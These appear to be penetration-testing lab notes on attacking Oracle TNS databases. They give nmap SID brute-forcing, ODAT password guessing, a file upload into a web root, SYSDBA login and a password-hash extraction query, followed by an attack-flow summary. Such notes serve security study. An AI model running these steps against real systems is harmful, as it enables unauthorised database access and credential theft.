## Key Concepts

- Oracle TNS = listener service for Oracle databases
- Default port: 1521
- SID = identifies database instance (required for login)
- Misconfigurations allow SID brute force + credential attacks
- tnsnames.ora (client config), listener.ora (server config)

---

## Enumeration

### Service detection

```bash
nmap -p1521 -sV <IP>
```

### SID brute force

```bash
nmap -p1521 --script oracle-sid-brute <IP>
```

### TNS version + SID enumeration

```bash
nmap -p1521 --script "oracle-tns-version,oracle-sid-brute" <IP>
```

---

## ODAT (Oracle Exploitation Tool)

### Full enumeration

```bash
./odat.py all -s <IP>
```

### SID / credential guessing

```bash
./odat.py passwordguesser -s <IP> -d <SID>

sudo odat passwordguesser -s 10.129.83.221 -p 1521 -d XE --accounts-file /usr/share/odat/accounts/accounts.txt
```

### File upload (requires valid credentials)

```bash
odat utlfile -s <FQDN/IP> -d <db> -U <user> -P <pass> --sysdba --putFile C:\\insert\\path file.txt ./file.txt
```

```bash
# Example
┌──(kali㉿kali)-[/tmp]
└─$ odat utlfile -s 10.129.83.221 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt /tmp/testing.txt

[1] (10.129.83.221:1521): Put the /tmp/testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.83.221 server                 
[+] The /tmp/testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.83.221 server like the testing.txt file

┌──(kali㉿kali)-[/tmp]
└─$ curl -X GET http://10.129.83.221/testing.txt                                         
Oracle File Upload Test
```
---

## SQLPlus Access

### Login

```bash
sqlplus user/pass@<IP>/<SID>
```

### SYSDBA login (privilege escalation attempt)

```bash
sqlplus user/pass@<IP>/<SID> as sysdba
```

---

## SQL Enumeration (inside Oracle DB)

### List tables

```bash
select table_name from all_tables;
```

### Show users

```bash
select username from all_users;
```

### Check privileges

```
select * from user_role_privs;
```

### Extract password hashes (high value target)

```
select name, password from sys.user$;
```

---

## Important File Locations

```bash
$ORACLE_HOME/network/admin/tnsnames.ora
$ORACLE_HOME/network/admin/listener.ora
```

## Attack Flow Summary

1. Scan 1521 (confirm Oracle TNS)
2. Brute-force SID
3. Enumerate users/versions
4. Find credentials (ODAT or guessing)
5. Login via sqlplus
6. Enumerate DB (tables, roles, users)
7. Attempt SYSDBA escalation
8. Extract hashes / upload files (if possible)